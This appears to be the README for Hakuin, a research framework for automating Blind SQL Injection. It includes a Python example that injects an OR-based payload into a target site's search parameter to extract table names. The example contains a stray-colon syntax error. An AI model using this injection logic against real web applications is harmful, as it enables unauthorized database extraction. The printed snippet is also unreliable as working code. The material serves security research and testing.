<p align="center">
    <img width="150" src="https://raw.githubusercontent.com/pruzko/hakuin/main/logo.png">
</p>

Hakuin is a Blind SQL Injection (BSQLI) optimization and automation framework written in Python 3. It abstracts away the extraction logic and allows users to easily and efficiently dump databases from vulnerable web applications. To speed up the process, Hakuin utilizes a variety of optimization methods, including pre-trained and adaptive language models, opportunistic guessing, statistical modeling, parallelism, ternary queries, and more.

Hakuin has been presented at esteemed academic and industrial conferences:
- [BSides, Bratislava](https://bsidesba.sk/schedule), 2025
- [BlackHat MEA, Riyadh](https://blackhatmea.com/session/hakuin-injecting-brain-blind-sql-injection), 2023
- [Hack in the Box, Phuket](https://conference.hitb.org/hitbsecconf2023hkt/session/hakuin-injecting-brains-into-blind-sql-injection/), 2023
- [IEEE S&P Workshop on Offsensive Technology (WOOT)](https://wootconference.org/papers/woot23-paper17.pdf), 2023

More information can be found in our [paper](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_WOOT_23.pdf) and [slides](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_HITB_23.pdf).



## Installation
To install Hakuin, simply run:
```
pip3 install hakuin
```



## Command Line Tool
Hakuin ships with an intuitive tool that offers most of Hakuin's features directly from the command line:
```
hk -h
```



## Custom Scripting
Sometimes, BSQLI vulnerabilities are too tricky to exploit from the command line and require custom scripting. This is where Hakuin shines, allowing you to customize absolutely everything - the injection logic, the inference logic, and even the queries.

Here is a minimal example:
```python
import asyncio
import aiohttp
from hakuin import Extractor, Requester

class SimpleRequester(Requester):
    async def request(self, query, ctx):
        payload = query.render(ctx)
        url = f'http://target.com/users?search=XXX" OR ({payload})--'
        async with aiohttp.request('GET', url) as resp:
            return resp.status == 200

async def main():
    requester = SimpleRequester():
    ext = Extractor(requester=requester, dbms='sqlite')
    data = await ext.extract_table_names()
    print(data)

asyncio.run(main())
```

Make sure to go through our [tutorial](https://github.com/pruzko/hakuin/blob/main/publications/TUTORIAL.md).



## For Researchers
This repository is actively developed to fit the needs of security practitioners. Researchers looking to reproduce the experiments described in our paper should install the [frozen version](https://zenodo.org/record/7804243) as it contains the original code, experiment scripts, and an instruction manual for reproducing the results.


#### Cite Hakuin
```
@inproceedings{hakuin_bsqli,
  title={Hakuin: Optimizing Blind SQL Injection with Probabilistic Language Models},
  author={Pru{\v{z}}inec, Jakub and Nguyen, Quynh Anh},
  booktitle={2023 IEEE Security and Privacy Workshops (SPW)},
  pages={384--393},
  year={2023},
  organization={IEEE}
}
```
